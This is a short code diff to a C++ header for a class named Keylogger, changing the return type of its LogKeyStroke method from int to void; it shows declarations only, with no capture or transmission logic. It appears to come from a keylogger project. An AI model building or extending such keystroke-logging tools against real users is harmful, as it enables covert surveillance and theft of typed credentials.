@@ -13,7 +13,7 @@ public:
     Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo& windowInfo, KeyInput& keyInput);
 
     void Listen();
-    int LogKeyStroke(int keyStroke);
+    void LogKeyStroke(int keyStroke);
 
 private:
     OSManager& _manager;
